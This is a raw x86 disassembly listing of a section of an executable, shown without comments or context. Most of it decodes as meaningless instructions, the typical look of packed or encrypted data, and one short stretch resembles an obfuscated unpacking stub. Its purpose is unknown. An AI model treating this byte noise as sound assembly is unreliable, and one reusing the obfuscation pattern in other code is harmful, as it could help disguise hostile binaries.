  40ab85:	arpl   WORD PTR [eax+0x1b98ec6d],si
  40ab8b:	imul   esp,DWORD PTR [eax+0x56e021d4],0xffffff85
  40ab92:	jae    0x40ab84
  40ab94:	(bad)  
  40ab95:	fldenv [edx-0x25]
  40ab98:	lods   al,BYTE PTR ds:[esi]
  40ab99:	and    esi,eax
  40ab9b:	loop   0x40ac13
  40ab9d:	ret    0x1d91
  40aba0:	pop    edi
  40aba1:	pop    ebp
  40aba2:	xchg   esi,eax
  40aba3:	push   eax
  40aba4:	(bad)  
  40aba5:	add    eax,0x1a65450c
  40abaa:	shl    DWORD PTR [ebp+0x5],1
  40abad:	pop    ss
  40abae:	mov    ebx,0x7b54a74c
  40abb3:	sbb    DWORD PTR [ecx+0x1],esi
  40abb6:	fs pop ebp
  40abb8:	jno    0x40ab4f
  40abba:	xchg   edx,eax
  40abbb:	shl    BYTE PTR [eax+esi*8+0xb],0x8b
  40abc0:	cmp    dh,bl
  40abc2:	into   
  40abc3:	rol    edx,1
  40abc5:	xchg   ebp,eax
  40abc6:	loope  0x40abb0
  40abc8:	jecxz  0x40ac01
  40abca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abcb:	sub    DWORD PTR [eax],esi
  40abcd:	imul   ebx,DWORD PTR [ebx-0x42d507fb],0x40
  40abd4:	sub    eax,0x35ffe60c
  40abd9:	sub    DWORD PTR [edi-0x13da45e1],0x77298075
  40abe3:	or     eax,0x5e824f12
  40abe8:	inc    ecx
  40abe9:	bound  ecx,QWORD PTR [esi+0x34e4e0af]
  40abef:	mov    al,ch
  40abf1:	push   0xb8c50e2b
  40abf6:	fsubr  DWORD PTR [esi-0x1437354f]
  40abfc:	in     al,0xf0
  40abfe:	mov    ah,0x5d
  40ac00:	jb     0x40ac48
  40ac02:	adc    al,0x6d
  40ac04:	mov    WORD PTR [edi+0x35],fs
  40ac07:	push   edi
  40ac08:	and    al,0x23
  40ac0a:	repnz ins BYTE PTR es:[edi],dx
  40ac0c:	jmp    0x40abb1
  40ac0e:	cmp    ecx,DWORD PTR [ebp-0x49ab8aae]
  40ac14:	nop
  40ac15:	sub    eax,ecx
  40ac17:	push   ds
  40ac18:	mov    edx,0x4b27ab87
  40ac1d:	jo     0x40ac48
  40ac1f:	outs   dx,BYTE PTR ds:[esi]
  40ac20:	fidiv  DWORD PTR [eax-0x29fffcc3]
  40ac26:	xor    edi,DWORD PTR [edi+0x245e71fa]
  40ac2c:	add    al,ah
  40ac2e:	enter  0xcee2,0x92
  40ac32:	stc    
  40ac33:	mov    WORD PTR [eax],ds
  40ac35:	pop    ebp
  40ac36:	fcmove st,st(6)
  40ac38:	scas   eax,DWORD PTR es:[edi]
  40ac39:	mov    ebp,0xf3c18284
  40ac3e:	or     DWORD PTR [ebx],eax
  40ac40:	cs in  al,0x32
  40ac43:	add    al,0xae
  40ac45:	mov    ebx,0x3fd1f158
  40ac4a:	psubd  mm6,QWORD PTR [ebp+0x7b4acf2d]
  40ac51:	sub    DWORD PTR [ebx+0x6eabb05a],edx
  40ac57:	xchg   ebp,edx
  40ac59:	nop    DWORD PTR [eax-0x29]
  40ac5d:	mov    ch,0x70
  40ac5f:	sub    ebx,0xffffffd2
  40ac62:	lods   eax,DWORD PTR ds:[esi]
  40ac63:	aam    0x67
  40ac65:	daa    
  40ac66:	and    dl,BYTE PTR [edx+edx*2]
  40ac69:	pop    eax
  40ac6a:	push   esp
  40ac6b:	repnz or esi,DWORD PTR [ebx+ecx*4-0x4e]
  40ac70:	test   eax,0xb00c4a45
  40ac75:	test   DWORD PTR [ecx],edx
  40ac77:	mov    al,BYTE PTR [edi-0x3d]
  40ac7a:	das    
  40ac7b:	and    al,0x89
  40ac7d:	dec    edx
  40ac7e:	in     eax,dx
  40ac7f:	ss nop
  40ac81:	cmc    
  40ac82:	push   ss
  40ac83:	jns    0x40ac6f
  40ac85:	push   ecx
  40ac86:	sahf   
  40ac87:	outs   dx,DWORD PTR ds:[esi]
  40ac88:	xchg   edx,eax
  40ac89:	dec    edi
  40ac8a:	jo     0x40ad0b
  40ac8c:	jmp    0x7b78373d
  40ac91:	dec    eax
  40ac92:	adc    al,0xac
  40ac94:	jo     0x40ad0d
  40ac96:	sbb    DWORD PTR [esi],esp
  40ac98:	scas   al,BYTE PTR es:[edi]
  40ac99:	out    0x5d,eax
  40ac9b:	and    eax,0xb7a0374d
  40aca0:	loop   0x40ac9c
  40aca2:	push   ss
  40aca3:	retf   
  40aca4:	xchg   edi,eax
  40aca5:	aaa    
  40aca6:	cmp    DWORD PTR [ebx+ecx*8+0x12],eax
  40acaa:	jbe    0x40aca7
  40acac:	aas    
  40acad:	shl    ah,0x87
  40acb0:	pop    es
  40acb1:	fxam   
  40acb3:	cmp    eax,0x7497b45e
  40acb8:	xor    eax,0xd07f438f
  40acbd:	xor    esp,DWORD PTR [ecx+0x52]
  40acc0:	ficom  DWORD PTR [ebx]
  40acc2:	jecxz  0x40acc5
  40acc4:	xchg   esp,eax
  40acc5:	(bad)  
  40acc6:	(bad)  
  40acc7:	jle    0x40acf1
  40acc9:	or     BYTE PTR [ebx+esi*2-0x43861ea2],cl
  40acd0:	xor    DWORD PTR [edx-0x4e410a63],ebx
  40acd6:	ret    0xecf4
  40acd9:	scas   eax,DWORD PTR es:[edi]
  40acda:	jo     0x40acf1
  40acdc:	out    0x70,al
  40acde:	mov    ch,0xbb
  40ace0:	inc    ecx
  40ace1:	lods   eax,DWORD PTR ds:[esi]
  40ace2:	or     bl,BYTE PTR [edx]
  40ace4:	add    dl,ch
  40ace6:	cmp    esi,edi
  40ace8:	stos   DWORD PTR es:[edi],eax
  40ace9:	shl    BYTE PTR [esi+eiz*4-0x9e77d65],1
  40acf0:	imul   esi,DWORD PTR [ebx-0x7c],0x6e
  40acf4:	sub    al,0x28
  40acf6:	rol    DWORD PTR [edi*8+0x4dc60f8a],cl
  40acfd:	cwde   
  40acfe:	mov    al,ds:0xb6034894
  40ad03:	fcomp  QWORD PTR [edi-0x5c]
  40ad06:	xor    DWORD PTR [esp+esi*1],edx
  40ad09:	or     edx,0x92da4968
  40ad0f:	arpl   WORD PTR [ebp+0x362d7dc9],di
  40ad15:	into   
  40ad16:	add    eax,esp
  40ad18:	ret    0xe329
  40ad1b:	jnp    0x40ad14
  40ad1d:	xchg   ebx,eax
  40ad1e:	push   esp
  40ad1f:	or     ch,BYTE PTR [ebx+0x25]
  40ad22:	ror    esp,1
  40ad24:	cvtps2pi mm4,QWORD PTR [eax-0x33]
  40ad28:	jne    0x40acb9
  40ad2a:	loopne 0x40ad0d
  40ad2c:	loopne 0x40acc7
  40ad2e:	aas    
  40ad2f:	cwde   
  40ad30:	popa   
  40ad31:	popf   
  40ad32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad33:	mov    ch,BYTE PTR [edi-0x6c]
  40ad36:	hlt    
  40ad37:	das    
  40ad38:	xchg   ecx,eax
  40ad39:	cmp    cl,bh
  40ad3b:	xchg   DWORD PTR [esi+0x4],edi
  40ad3e:	lock pop esp
  40ad40:	outs   dx,BYTE PTR ds:[esi]
  40ad41:	inc    edi
  40ad42:	push   0x45
  40ad44:	or     esi,DWORD PTR [ecx-0x19111e4a]
  40ad4a:	sar    ecx,cl
  40ad4c:	mov    edi,0xf1d8dd04
  40ad51:	aad    0xcf
  40ad53:	cmp    eax,0x256b65c2
  40ad58:	call   0x1ba7ff06
  40ad5d:	ret    0xb116
  40ad60:	jmp    0xfd8cbf01
  40ad65:	sti    
  40ad66:	add    edx,DWORD PTR [edx-0x4acdf28b]
  40ad6c:	inc    ebp
  40ad6d:	out    0x95,eax
  40ad6f:	and    ebp,DWORD PTR [edx-0x41]
  40ad72:	popf   
  40ad73:	lock push ebx
  40ad75:	sahf   
  40ad76:	dec    eax
  40ad77:	call   FWORD PTR [ecx]
  40ad79:	loope  0x40ad96
  40ad7b:	dec    ecx
  40ad7c:	shl    ah,1
  40ad7e:	out    0xd7,al
  40ad80:	pop    ecx
  40ad81:	or     al,0xfd
  40ad83:	int    0x29
  40ad85:	mov    esp,0xefc4d2e8
  40ad8a:	lock adc ecx,DWORD PTR [edx+0x5c685438]
  40ad91:	jno    0x40adcf
  40ad93:	xchg   esp,eax
  40ad94:	adc    cl,BYTE PTR [edi+0x10]
  40ad97:	sti    
  40ad98:	ret    0x285e
  40ad9b:	xor    BYTE PTR [eax+0x4],dh
  40ad9e:	fs adc eax,0x214677b1
  40ada4:	sub    DWORD PTR [edx],esp
  40ada6:	das    
  40ada7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada8:	jnp    0x40ae0f
  40adaa:	inc    esi
  40adab:	xor    eax,0x8b447d2d
  40adb0:	int3   
  40adb1:	add    cl,bl
  40adb3:	das    
  40adb4:	bswap  esi
  40adb6:	jge    0x40ad95
  40adb8:	rcr    DWORD PTR [edx],0xd2
  40adbb:	(bad)  
  40adbc:	out    dx,al
  40adbd:	jmp    0x40ae0c
  40adbf:	arpl   WORD PTR [ecx],bx
  40adc1:	push   0x41b0cd45
  40adc6:	in     al,dx
  40adc7:	sar    ah,0xd0
  40adca:	into   
  40adcb:	icebp  
  40adcc:	mov    ds:0x4ce0b3b1,al
  40add1:	aaa    
  40add2:	mov    dh,BYTE PTR [eax+0x3da8123f]
  40add8:	cli    
  40add9:	into   
  40adda:	ficom  WORD PTR [ebx-0x20ccc884]
  40ade0:	adc    DWORD PTR [ecx-0x457ab3aa],ecx
  40ade6:	ficomp DWORD PTR [ebp+eiz*1+0x69]
  40adea:	stos   BYTE PTR es:[edi],al
  40adeb:	in     al,dx
  40adec:	out    0xe7,eax
  40adee:	inc    esi
  40adef:	pop    edi
  40adf0:	fwait
  40adf1:	js     0x40ad82
  40adf3:	add    esi,eax
  40adf5:	push   esp
  40adf6:	sub    eax,DWORD PTR [eax-0x5356af7a]
  40adfc:	sbb    DWORD PTR [edx],0xc13bbaae
  40ae02:	push   edi
  40ae03:	call   0x655c:0xb18d06f3
  40ae0a:	sbb    esi,DWORD PTR [esi-0x2c]
  40ae0d:	push   0xffffffc3
  40ae0f:	les    esi,FWORD PTR [ecx]
  40ae11:	lock inc esp
  40ae13:	lock and al,0x2
  40ae16:	cwde   
  40ae17:	in     al,dx
  40ae18:	dec    eax
  40ae19:	push   ds
  40ae1a:	jo     0x40adb7
  40ae1c:	mov    WORD PTR [edx+edi*8-0x9],cs
  40ae20:	push   ebx
  40ae21:	aam    0x9d
  40ae23:	ret    
  40ae24:	jmp    0xa880:0x97e7bbd4
  40ae2b:	pop    ebx
  40ae2c:	and    al,0xf7
  40ae2e:	mov    BYTE PTR [eax-0xa5afd8a],0xf4
  40ae35:	jge    0x40aea1
  40ae37:	mov    ebx,0x5cfb668
  40ae3c:	mov    esi,0x60829b35
  40ae41:	call   0xdc377ddb
  40ae46:	dec    ebx
  40ae47:	(bad)  
  40ae48:	loopne 0x40ae11
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42826b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428233
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428367,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42824b
  40aea0:	cmp    DWORD PTR ds:0x42826b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42809b
  40aebd:	call   DWORD PTR ds:0x428e58
  40aec3:	mov    ecx,DWORD PTR ds:0x4282eb
  40aec9:	xor    DWORD PTR ds:0x42820f,ecx
  40aecf:	or     DWORD PTR ds:0x42835b,ecx
  40aed5:	or     DWORD PTR ds:0x428273,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42827f
  40aee1:	adc    DWORD PTR ds:0x428247,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428143
  40aeef:	adc    ecx,DWORD PTR ds:0x428367
  40aef5:	mov    DWORD PTR ds:0x428143,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428363,0x4282d7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428143,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	retf   
  40af30:	aam    0xeb
  40af32:	mov    esi,0x18181bb5
  40af37:	outs   dx,BYTE PTR ds:[esi]
  40af38:	adc    bl,BYTE PTR [eax]
  40af3a:	sbb    BYTE PTR [ecx-0x33079614],bh
  40af40:	add    BYTE PTR [ebx+0x3e],ah
  40af43:	int3   
  40af44:	sbb    DWORD PTR [ecx],esi
  40af46:	hlt    
  40af47:	inc    edi
  40af48:	jp     0x40af66
  40af4a:	imul   esi,DWORD PTR [ebx+0x3dbab10c],0xffffffbe
  40af51:	pop    ebx
  40af52:	sub    DWORD PTR [edi-0x7da1ef4f],eax
  40af58:	push   edi
  40af59:	int    0x68
  40af5b:	jne    0x40afc7
  40af5d:	xchg   ebx,eax
  40af5e:	dec    esi
  40af5f:	out    0xf5,eax
  40af61:	fsub   st,st(2)
  40af63:	pusha  
  40af64:	inc    edx
  40af65:	and    DWORD PTR [esi-0x7ccf46ac],edi
  40af6b:	sbb    eax,0xec42105e
  40af70:	xlat   BYTE PTR ds:[ebx]
  40af71:	adc    bl,dl
  40af73:	add    ebx,esi
  40af75:	stos   BYTE PTR es:[edi],al
  40af76:	cmp    al,0x10
  40af78:	popf   
  40af79:	js     0x40afec
  40af7b:	ror    DWORD PTR [ebx+0x3b],1
  40af7e:	push   0xffffffbc
  40af80:	xor    al,BYTE PTR [ebx+0x633dabc3]
  40af86:	xchg   ebp,eax
  40af87:	push   ebx
  40af88:	mov    edi,0x19782f25
  40af8d:	jne    0x40af85
  40af8f:	fisubr WORD PTR [edx+0x52ee7799]
  40af95:	clc    
  40af96:	xor    ah,BYTE PTR [ebp-0x4901464e]
  40af9c:	dec    edx
  40af9d:	scas   eax,DWORD PTR es:[edi]
  40af9e:	mov    eax,ds:0x30b0757c
  40afa3:	pop    ebx
  40afa4:	in     al,dx
  40afa5:	out    dx,al
  40afa6:	repnz pop ds
  40afa8:	scas   eax,DWORD PTR es:[edi]
  40afa9:	rcl    cl,1
  40afab:	out    0x23,al
  40afad:	inc    esi
  40afae:	test   al,0x1a
  40afb0:	mov    edi,0x974bf4f7
  40afb5:	mov    ah,0xf9
  40afb7:	cmp    eax,0xeb6f40f6
  40afbc:	ins    BYTE PTR es:[edi],dx
  40afbd:	stos   DWORD PTR es:[edi],eax
  40afbe:	cmp    edi,esp
  40afc0:	or     eax,0xa1e5e8d3
  40afc5:	retf   
  40afc6:	call   0xb7f25233
  40afcb:	ret    0xca94
  40afce:	mov    edi,0x6768be07
  40afd3:	sahf   
  40afd4:	fstp   QWORD PTR [edx+0x27c280da]
  40afda:	aam    0x4f
  40afdc:	outs   dx,DWORD PTR ds:[esi]
  40afdd:	adc    ecx,DWORD PTR [ebx+eiz*2]
  40afe0:	add    ebx,0xab312ef9
  40afe6:	inc    edi
  40afe7:	retf   
  40afe8:	popf   
  40afe9:	jae    0x40b052
  40afeb:	arpl   WORD PTR [edi-0x2a70d687],ax
  40aff1:	add    ebx,DWORD PTR [eax-0x63fc4484]
  40aff7:	xchg   ecx,eax
  40aff8:	pop    edx
  40aff9:	add    ah,ah
  40affb:	adc    ebx,DWORD PTR [esi]
  40affd:	ret    
  40affe:	fistp  WORD PTR [esi+edx*8]
  40b001:	pop    ecx
  40b002:	dec    esp
  40b003:	mov    cl,0x79
  40b005:	pop    ecx
  40b006:	pop    ds
  40b007:	inc    ebp
  40b008:	sub    eax,0x34215ba2
  40b00d:	lock seta BYTE PTR [esi+0x71]
  40b012:	mov    ch,0x52
  40b014:	adc    dh,cl
  40b016:	stos   DWORD PTR es:[edi],eax
  40b017:	add    dh,al
  40b019:	inc    BYTE PTR [edi]
  40b01b:	(bad)  
  40b01c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b01d:	out    0xec,al
  40b01f:	ja     0x40b083
  40b021:	jb     0x40b019
  40b023:	mov    al,0xe7
  40b025:	aas    
  40b026:	xor    eax,0xf56a65ee
  40b02b:	mov    ch,0xb2
  40b02d:	mov    bl,0xea
  40b02f:	jb     0x40b0ac
  40b031:	sbb    al,0x36
  40b033:	fwait
  40b034:	or     bl,BYTE PTR [esi]
  40b036:	cmp    edx,DWORD PTR [ecx+0x21]
  40b039:	sub    ebp,ecx
  40b03b:	inc    ebp
  40b03c:	cli    
  40b03d:	sub    dh,0xe0
  40b040:	imul   BYTE PTR [edx]
  40b042:	fistp  QWORD PTR [eax]
  40b044:	sub    ch,BYTE PTR [ebx+0x5198716e]
  40b04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b04b:	ja     0x40afec
  40b04d:	paddsw mm7,QWORD PTR [ebx+0x2c54349f]
  40b054:	push   ds
  40b055:	out    dx,al
  40b056:	inc    ecx
  40b057:	mov    ch,BYTE PTR [eax+edx*2]
  40b05a:	mov    eax,ds:0xf06e678a
  40b05f:	retf   0x9aa8
  40b062:	sbb    al,0x4b
  40b064:	js     0x40b070
  40b066:	add    al,0xd3
  40b068:	pop    ecx
  40b069:	cmp    al,0xb1
  40b06b:	or     ch,ch
  40b06d:	out    dx,eax
  40b06e:	fcmove st,st(2)
  40b070:	push   0x16
  40b072:	dec    edi
  40b073:	pop    ss
  40b074:	pop    ebp
  40b075:	lock jecxz 0x40affe
  40b078:	fmulp  st(2),st
  40b07a:	out    dx,eax
  40b07b:	inc    esp
  40b07c:	int3   
  40b07d:	retf   
  40b07e:	iret   
  40b07f:	daa    
  40b080:	call   0xe824:0xa03fb14b
  40b087:	ja     0x40b021
  40b089:	jp     0x40b0d4
  40b08b:	imul   ebp,ebp,0xffffffce
  40b08e:	push   edi
  40b08f:	fs mov ecx,0xaf14ce95
  40b095:	mov    ecx,0xd154f377
  40b09a:	js     0x40b113
  40b09c:	jns    0x40b07c
  40b09e:	scas   al,BYTE PTR es:[edi]
  40b09f:	shl    BYTE PTR [ebp+0x2b],0x26
  40b0a3:	cmp    BYTE PTR [ebx+edi*1+0x16],bl
  40b0a7:	add    BYTE PTR [ecx],al
  40b0a9:	jbe    0x40b052
  40b0ab:	xor    bh,dl
  40b0ad:	dec    esi
  40b0ae:	mov    ebp,0xee8e83b4
  40b0b3:	adc    bl,cl
  40b0b5:	rcr    DWORD PTR [eax-0x74],1
  40b0b8:	cmp    BYTE PTR [eax],0x20
  40b0bb:	sbb    eax,0xde483976
  40b0c0:	sti    
  40b0c1:	mov    esp,0x91e47855
  40b0c6:	sbb    bh,BYTE PTR [esi]
  40b0c8:	(bad)  
  40b0c9:	push   edi
  40b0ca:	repnz rcr DWORD PTR [eax+edx*2+0x4],0xbd
  40b0d0:	int    0x8e
  40b0d2:	xchg   esp,eax
  40b0d3:	mov    esi,DWORD PTR [esi]
  40b0d5:	ret    
  40b0d6:	mov    dl,0x36
  40b0d8:	pusha  
  40b0d9:	xchg   edi,eax
  40b0da:	cld    
  40b0db:	and    eax,0xb740973c
  40b0e0:	rcl    al,cl
  40b0e2:	int    0x80
  40b0e4:	xchg   esp,eax
  40b0e5:	shl    BYTE PTR ds:0xbecd0ac9,1
  40b0eb:	hlt    
  40b0ec:	arpl   WORD PTR [edi-0x1e],di
  40b0ef:	mov    ah,0x36
  40b0f1:	inc    eax
  40b0f2:	xor    al,0xba
  40b0f4:	mov    edi,DWORD PTR [edx+eax*8]
  40b0f7:	pop    esi
  40b0f8:	or     al,0x73
  40b0fa:	das    
  40b0fb:	test   al,0xc4
  40b0fd:	bnd call 0x7c1de943
  40b103:	mov    eax,0xab18707e
  40b108:	sub    ecx,ebp
  40b10a:	ss jge 0x40b16e
  40b10d:	es jo  0x40b0c0
  40b110:	test   al,0xa0
  40b112:	jne    0x40b157
  40b114:	sub    dh,al
  40b116:	ds aaa 
  40b118:	call   0xbd239b5d
  40b11d:	sub    eax,0x8b6f701f
  40b122:	mov    bl,0xeb
  40b124:	call   DWORD PTR [eax]
  40b126:	dec    edx
  40b127:	repnz mov cl,0x55
  40b12a:	cli    
  40b12b:	cmp    BYTE PTR [ecx],bl
  40b12d:	lock fcomp QWORD PTR ds:[eax]
  40b131:	mov    BYTE PTR [esi+0x7f9efe1e],dh
  40b137:	push   esp
  40b138:	xor    esi,esi
  40b13a:	mov    esi,0x662c13e5
  40b13f:	adc    ebx,DWORD PTR [ecx+0x4b]
  40b142:	mov    ch,0xe8
  40b144:	fstp   QWORD PTR [ebp-0x30]
  40b147:	icebp  
  40b148:	nop
  40b149:	xor    BYTE PTR [eax],al
  40b14b:	jmp    0xa358cb4e
  40b150:	inc    esi
  40b151:	punpckldq mm1,DWORD PTR [eax-0xc14b3b1]
  40b158:	inc    edi
  40b159:	push   0xaae868fe
  40b15e:	(bad)  
  40b15f:	pop    edi
  40b160:	lods   eax,DWORD PTR ds:[esi]
  40b161:	jle    0x40b136
  40b163:	(bad)  
  40b164:	jnp    0x40b168
  40b166:	(bad)  
  40b167:	push   cs
  40b168:	ja     0x40b1cb
  40b16a:	xor    ebx,DWORD PTR [ebx-0x5bf8609f]
  40b170:	repnz xlat BYTE PTR ds:[ebx]
  40b172:	sbb    bh,BYTE PTR [ecx+0x68965b06]
  40b178:	stc    
  40b179:	out    0xdd,eax
  40b17b:	pop    es
  40b17c:	mov    al,ah
  40b17e:	jno    0x40b187
  40b180:	inc    ebp
  40b181:	fwait
  40b182:	mov    dl,0x59
  40b184:	jp     0x40b17e
  40b186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b187:	pop    edi
  40b188:	inc    esp
  40b189:	nop
  40b18a:	inc    eax
  40b18b:	mov    ch,0x8c
  40b18d:	cli    
  40b18e:	xor    al,0xa8
  40b190:	jle    0x40b11c
  40b192:	scas   eax,DWORD PTR es:[edi]
  40b193:	inc    eax
  40b194:	ss mov cl,0xe7
  40b197:	pop    ss
  40b198:	dec    esp
  40b199:	pop    eax
  40b19a:	pusha  
  40b19b:	xor    BYTE PTR [ebx-0x6b311f9d],ch
  40b1a1:	or     al,0x5c
  40b1a3:	xchg   esi,eax
  40b1a4:	dec    DWORD PTR [ebp+0x14]
  40b1a7:	mov    BYTE PTR [eax+0x61868163],ch
  40b1ad:	pop    edx
  40b1ae:	inc    ebp
  40b1af:	xchg   esp,eax
  40b1b0:	inc    ebp
  40b1b1:	ret    0x77c0
  40b1b4:	jne    0x40b19b
  40b1b6:	aaa    
  40b1b7:	xor    BYTE PTR [edi],0x80
  40b1ba:	sbb    al,0x62
  40b1bc:	js     0x40b1a7
  40b1be:	lods   eax,DWORD PTR ds:[esi]
  40b1bf:	sbb    al,0xe2
  40b1c1:	mov    cl,0x18
  40b1c3:	scas   eax,DWORD PTR es:[edi]
  40b1c4:	adc    esi,DWORD PTR ds:0xba5a7ca8
  40b1ca:	inc    edx
  40b1cb:	lds    edx,FWORD PTR [ebx]
  40b1cd:	add    edi,DWORD PTR [esi+0x64dd501]
  40b1d3:	ins    DWORD PTR es:[edi],dx
  40b1d4:	dec    esi
  40b1d5:	and    bl,al
  40b1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d8:	in     al,dx
  40b1d9:	and    BYTE PTR [eax+0x4dee3e51],bl
  40b1df:	into   
  40b1e0:	ds jl  0x40b23f
  40b1e3:	adc    DWORD PTR [ebx],ebp
  40b1e5:	test   al,0xe
  40b1e7:	ret    
  40b1e8:	mov    bh,0xff
  40b1ea:	in     eax,0x13
  40b1ec:	pop    ss
  40b1ed:	cli    
  40b1ee:	push   ds
  40b1ef:	imul   esp,edi,0x87020ed2
  40b1f5:	ins    BYTE PTR es:[edi],dx
  40b1f6:	pop    ebp
  40b1f7:	loop   0x40b21b
  40b1f9:	hlt    
  40b1fa:	data16 mov BYTE PTR [edi+0x4c95090b],ch
  40b201:	ins    BYTE PTR es:[edi],dx
  40b202:	mov    ebx,0x328b28af
  40b207:	paddd  mm1,QWORD PTR [edx]
  40b20a:	sqrtps xmm6,XMMWORD PTR [eax+0x42]
  40b20e:	in     al,0x15
  40b210:	sub    eax,0x41cd90f4
  40b215:	arpl   WORD PTR [edx+0x77],cx
  40b218:	mov    edi,ebx
  40b21a:	je     0x40b1a8
  40b21c:	inc    esp
  40b21d:	mov    ch,0xbc
  40b21f:	xchg   ebp,eax
  40b220:	jb     0x40b1b3
  40b222:	outs   dx,DWORD PTR ds:[esi]
  40b223:	pop    ecx
  40b224:	xor    esp,DWORD PTR [esi]
  40b226:	inc    ebx
  40b227:	out    0x6f,eax
  40b229:	js     0x40b263
  40b22b:	mov    edi,0xa5343f0f
  40b230:	repnz mov ebx,0x24e8b93c
  40b236:	mov    esi,0x6583e3a0
  40b23b:	das    
  40b23c:	adc    esp,edx
  40b23e:	mov    edi,0x15aff8c2
  40b243:	xor    DWORD PTR [edi-0x75],edx
  40b246:	fldcw  WORD PTR [ecx]
  40b248:	scas   eax,DWORD PTR es:[edi]
  40b249:	sub    eax,0xf194c3b4
  40b24e:	loop   0x40b2a4
  40b250:	xor    BYTE PTR [esi],0x23
  40b253:	and    dh,0x55
  40b256:	cmc    
  40b257:	mov    ebx,0xaa630c7f
  40b25c:	loope  0x40b2a3
  40b25e:	ror    BYTE PTR [eax],0x51
  40b261:	push   es
  40b262:	pop    eax
  40b263:	outs   dx,BYTE PTR ds:[esi]
  40b264:	cwde   
  40b265:	sbb    cl,BYTE PTR [edi+0x49e6d865]
  40b26b:	shl    DWORD PTR [edx-0x41],0x5b
  40b26f:	jno    0x40b261
  40b271:	das    
  40b272:	test   BYTE PTR [eax+0x65],0xda
  40b276:	inc    edx
  40b277:	pop    edi
  40b278:	pop    eax
  40b279:	mov    ss,edx
  40b27b:	scas   eax,DWORD PTR es:[edi]
  40b27c:	mov    edi,0x7eb625a8
  40b281:	jg     0x40b2ed
  40b283:	sbb    al,0x8b
  40b285:	cmp    esi,edi
  40b287:	stos   BYTE PTR es:[edi],al
  40b288:	(bad)  
  40b289:	jmp    0x40b211
  40b28b:	jae    0x40b306
  40b28d:	xor    al,0xc7
  40b28f:	pop    ds
  40b290:	pop    esi
  40b291:	jge    0x40b2f0
  40b293:	iret   
  40b294:	stc    
  40b295:	xchg   edi,eax
  40b296:	xor    DWORD PTR [ebp-0x60a58145],ecx
  40b29c:	mov    ebp,0x10b8f07a
  40b2a1:	stc    
  40b2a2:	daa    
  40b2a3:	dec    ecx
  40b2a4:	mov    ecx,0xc935bcb5
  40b2a9:	adc    esp,DWORD PTR [ecx]
  40b2ab:	xchg   ecx,eax
  40b2ac:	pop    esp
  40b2ad:	sahf   
  40b2ae:	push   0xb0118803
  40b2b3:	nop
  40b2b4:	out    dx,al
  40b2b5:	jbe    0x40b2d9
  40b2b7:	xor    BYTE PTR [esi+ebx*8],0x3e
  40b2bb:	inc    ebx
  40b2bc:	lea    esi,[ebx]
  40b2be:	pop    es
  40b2bf:	lea    esp,[eax-0x654b8fd1]
  40b2c5:	loope  0x40b2db
  40b2c7:	xchg   ebp,eax
  40b2c8:	pusha  
  40b2c9:	pop    edx
  40b2ca:	in     al,0x51
  40b2cc:	mov    WORD PTR [edi-0x74bf2c57],ds
  40b2d2:	xchg   ebp,eax
  40b2d3:	cmc    
  40b2d4:	pop    eax
  40b2d5:	jecxz  0x40b2eb
  40b2d7:	sbb    esp,DWORD PTR [edx-0x5b]
  40b2da:	or     ch,BYTE PTR [eax]
  40b2dc:	fsubr  QWORD PTR [esi-0x5d]
  40b2df:	or     al,0x72
  40b2e1:	add    dh,cl
  40b2e3:	xchg   ebx,eax
  40b2e4:	and    bh,BYTE PTR [eax-0x279b228d]
  40b2ea:	popa   
  40b2eb:	sbb    bh,cl
  40b2ed:	cmp    ah,BYTE PTR [edi-0x69]
  40b2f0:	scas   al,BYTE PTR es:[edi]
  40b2f1:	mov    al,ds:0x2efdbb97
  40b2f6:	mov    dh,0x55
  40b2f8:	inc    ecx
  40b2f9:	sub    bl,dh
  40b2fb:	dec    ecx
  40b2fc:	cli    
  40b2fd:	out    0x62,al
  40b2ff:	dec    ebp
  40b300:	mov    bl,0x58
  40b302:	or     BYTE PTR [edx-0x7777db27],cl
  40b308:	ret    0xc6a0
  40b30b:	leave  
  40b30c:	mov    ecx,0x7d2a2a37
  40b311:	dec    ebx
  40b312:	adc    BYTE PTR ss:[eax-0x7f],0x15
  40b317:	retf   
  40b318:	add    BYTE PTR [edx+0x0],0x83
  40b31c:	add    BYTE PTR [edx+0x0],0xe8
  40b320:	cld    
  40b321:	mov    eax,0x351b0000
  40b326:	ja     0x40b2aa
  40b328:	inc    edx
  40b329:	add    BYTE PTR [ebx-0x297e1fb3],cl
  40b32f:	xchg   BYTE PTR [ecx],ch
